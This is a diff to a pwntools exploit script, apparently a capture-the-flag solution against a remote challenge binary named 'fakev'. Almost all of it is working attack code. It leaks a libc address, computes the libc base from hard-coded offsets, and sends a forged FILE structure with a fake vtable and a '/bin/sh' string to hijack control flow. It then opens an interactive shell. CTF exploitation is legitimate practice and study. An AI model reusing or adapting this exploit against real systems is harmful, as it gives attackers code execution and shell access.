@@ -10,6 +10,9 @@ PORT = 9013
 p = remote(HOST, PORT)
 
 
+# p = process("./fakev")
+
+
 def choice(idx):
     p.sendlineafter("Choice: ", str(idx))
 
@@ -39,18 +42,19 @@ for i in range(1, 9):
 
 leak = read_(1)
 libc = u64(leak[8:16])
-print hex(libc)
+log.info("libc --> %s" % hex(libc))
 libc_base = libc - 0x3ebca0
-print hex(libc_base)
+log.info("libc_base --> %s" % hex(libc_base))
 
 fake_vtable_addr = libc_base + 0x3e8360 + 0x8
 
 for i in xrange(1, 10):
     open_(i)
 
-choice("4\x00\x00\x00\x00\x00\x00\x00" + p64(0x602110) + p64(0) * 5 + p64(0x602190) + p64(0) * 2 + p64(
-    (0x602190 - 100) / 2) + "KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQ/bin/sh\x00" + p64(
-    0x602258) + "TTTTTTTTUUUUUUUU" + p64(0x6021b0) + p64(0x602108) + p64(0) + "YYYYYYYYZZZZZZZZ[[[[[[[[::::::::" + p64(
+choice(b"4\x00\x00\x00\x00\x00\x00\x00" + p64(0x602110) + p64(0) * 5 + p64(0x602190) + p64(0) * 2 + p64(
+    (0x602190 - 100) / 2) + b"KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQ/bin/sh\x00" + p64(
+    0x602258) + b"TTTTTTTTUUUUUUUU" + p64(0x6021b0) + p64(0x602108) + p64(
+    0) + b"YYYYYYYYZZZZZZZZ[[[[[[[[::::::::" + p64(
     fake_vtable_addr) + p64(libc_base + 0x4f440))
 
 p.interactive()
